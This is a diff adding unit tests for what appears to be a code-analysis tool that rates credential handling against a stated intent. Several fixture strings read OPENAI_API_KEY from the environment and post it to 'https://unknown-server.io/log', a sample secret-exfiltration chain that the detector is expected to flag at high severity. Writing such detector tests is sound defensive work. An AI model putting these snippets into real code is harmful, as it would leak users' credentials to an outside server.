@@ -22,3 +22,27 @@ class BillingMigrationTests(unittest.TestCase):
   response,calls=self.webhook(failure=True);self.assertEqual(response.status_code,503);self.assertEqual(calls,0)
  def test_verified_paid_checkout_syncs(self):
   response,calls=self.webhook();self.assertEqual(response.status_code,200);self.assertEqual(calls,1)
+
+class CredentialSourceRegressionTests(unittest.TestCase):
+ def test_isolated_environment_read_is_notice_even_with_unspecified_intent(self):
+  result=main.analyze_code(code='import os\nkey = os.getenv("OPENAI_API_KEY")',intent='Read a local environment setting; do not transmit it.')
+  sources=[flag for flag in result['flags'] if flag.get('pattern')=='environment_secret_access']
+  self.assertTrue(sources)
+  self.assertTrue(all(flag['severity']<8 for flag in sources))
+ def test_exfiltration_keeps_high_severity(self):
+  result=main.analyze_code(code='import os, requests\nkey = os.getenv("OPENAI_API_KEY")\nrequests.post("https://unknown-server.io/log",json={"key":key})',intent='Build a local report. Do not transmit credentials.')
+  self.assertTrue(any(flag.get('pattern')=='secret_exfiltration_chain' and flag['severity']>=18 for flag in result['flags']))
+
+ def test_inline_environment_egress_does_not_require_assignment(self):
+  code='import os, requests\nrequests.post("https://unknown-server.io/log",json={"key":os.getenv("OPENAI_API_KEY")})'
+  result=main.analyze_code(intent='Build a local report. Do not transmit credentials.',code=code)
+  self.assertTrue(any(flag.get('pattern')=='secret_exfiltration_chain' and flag['severity']>=18 for flag in result['flags']))
+ def test_expected_inline_auth_has_destination_and_header_evidence(self):
+  code='import os, requests\nrequests.get("https://api.example.com/data",headers={"Authorization":os.getenv("API_KEY")})'
+  result=main.analyze_code(intent='Authenticate to api.example.com using an API key in the authorization header.',code=code)
+  self.assertFalse(any(flag.get('pattern')=='secret_exfiltration_chain' for flag in result['flags']))
+  self.assertTrue(any(flag.get('pattern')=='credential_authentication' for flag in result['flags']))
+ def test_negated_destination_does_not_authorize_inline_transmission(self):
+  code='import os, requests\nrequests.get("https://api.example.com/data",headers={"Authorization":os.getenv("API_KEY")})'
+  flags=main.inline_environment_egress(code,'Do not authenticate to api.example.com with any credential.')
+  self.assertTrue(any(flag['severity']>=18 for flag in flags))
